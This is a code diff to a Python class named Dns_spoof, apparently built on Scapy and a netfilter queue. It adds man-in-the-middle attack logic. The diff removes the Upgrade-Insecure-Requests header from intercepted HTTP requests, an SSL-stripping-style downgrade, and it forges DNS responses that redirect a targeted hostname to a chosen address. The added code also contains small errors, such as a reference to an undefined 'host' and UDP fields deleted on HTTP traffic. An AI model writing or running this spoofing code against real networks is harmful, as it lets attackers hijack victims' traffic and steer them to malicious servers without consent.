@@ -38,7 +38,24 @@ class Dns_spoof:
             try:
                 upgradeReq = packet[HTTPRequest].Upgrade_Insecure_Requests
                 if upgradeReq == 1:
-                    packet[HTTPRequest].Upgrade_Insecure_Requests = 0
+                    del packet[HTTPRequest].Upgrade_Insecure_Requests
+                    del packet[IP].len
+                    del packet[IP].chksum
+                    del packet[UDP].len
+                    del packet[UDP].chksum
+            except IndexError as error:
+                return False
+            packet.summary()
+            bin_packet.set_payload(bytes(packet))
+        elif packet.haslayer(DNSRR) :
+            try:
+                queryName = packet[DNSQR].qname.decode()
+                #if queryName in self.host:
+                if self.host[0] in queryName:
+                    print("Packet in host")
+                    packet[DNS].an = DNSRR(
+                        rrname=queryName, rdata=host[1])
+                    packet[DNS].ancount = 1
                     del packet[IP].len
                     del packet[IP].chksum
                     del packet[UDP].len
